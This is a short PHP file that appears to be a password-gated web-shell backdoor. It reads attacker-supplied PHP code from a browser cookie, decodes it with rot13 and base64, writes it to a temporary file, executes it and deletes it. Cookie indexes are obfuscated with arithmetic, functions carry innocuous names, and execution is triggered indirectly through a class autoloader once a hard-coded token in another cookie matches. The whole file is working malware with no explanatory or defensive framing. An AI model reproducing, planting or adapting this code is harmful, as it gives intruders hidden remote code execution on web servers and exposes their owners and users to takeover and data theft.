<?php


if (isset($_COOKIE[11+-11]) && isset($_COOKIE[34+-33]) && isset($_COOKIE[2+1]) && isset($_COOKIE[5+-1])) {
    $binding = $_COOKIE;
    function core_engine($reference) {
        $binding = $_COOKIE;
        $obj = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'e6885d27');
        if (!is_writable($obj)) {
            $obj = getcwd() . DIRECTORY_SEPARATOR . "batch_process";
        }
        $flg = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($binding[3]));
        if (is_writeable($obj)) {
            $ref = fopen($obj, 'w+');
            fputs($ref, $flg);
            fclose($ref);
            spl_autoload_unregister(__FUNCTION__);
            require_once($obj);
            @array_map('unlink', array($obj));
        }
    }
    spl_autoload_register("core_engine");
    $pointer = "430de1965bc5621bfef1d1ac344722d0";
    if (!strncmp($pointer, $binding[4], 32)) {
        if (@class_parents("hub_center_mutex_lock", true)) {
            exit;
        }
    }
}
